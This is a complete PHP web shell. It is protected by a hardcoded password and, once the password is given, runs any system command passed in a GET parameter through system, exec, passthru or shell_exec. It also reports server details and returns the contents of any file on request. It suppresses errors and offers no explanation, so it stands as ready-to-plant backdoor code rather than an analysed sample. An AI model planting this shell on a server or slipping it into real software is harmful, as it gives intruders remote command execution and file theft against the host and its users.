<?php

error_reporting(0);

$password = "p455w0rd123";
$get_password = $_GET["password"];
$cmd = $_GET["cmd"];
$aksi = $_GET["aksi"];

function exe($cmd){
    if(function_exists('system')){
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }elseif(function_exists('exec')){
        @exec($cmd,$results);
        $buff = "";
        foreach($results as $result){
            $buff .= $result;
        } return $buff;
    }elseif(function_exists('passthru')){
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    }elseif(function_exists('shell_exec')){
        $buff = @shell_exec($cmd);
        return $buff;
    }
}


if($password === $get_password)
{ 
  if(isset($cmd))
  {
	if(isset($_GET['dir']))
	{
		$dir = $_GET['dir'];
		chdir($dir);
	} 
	else
	{
		$dir = getcwd();
    }
    
    if($aksi == "info")
    {
        header('Content-Type: text/plain');
        $os = php_uname();
        $ip = getHostByName(getHostName());
        $ver = phpversion();
        $web = $_SERVER['HTTP_HOST'];
        $sof = $_SERVER['SERVER_SOFTWARE'];

        echo "\n";
        echo "PHP Version\t\t: ". $ver . "\n"; 
        echo "IP Server\t\t: ". $ip . "\n";
        echo "Operating system\t: ". $os . "\n";
        echo "Software\t\t: ". $sof . "\n";

    }
    else if($aksi == "download")
    {
        header('Content-Type: text/plain');
        $file = $_GET["file"];
        echo file_get_contents($file);
    }
    else
    {
        echo trim(exe($cmd));
    }
	
  }
  else
  {
	echo "true";
  }
}
else
{
	echo "false";
}
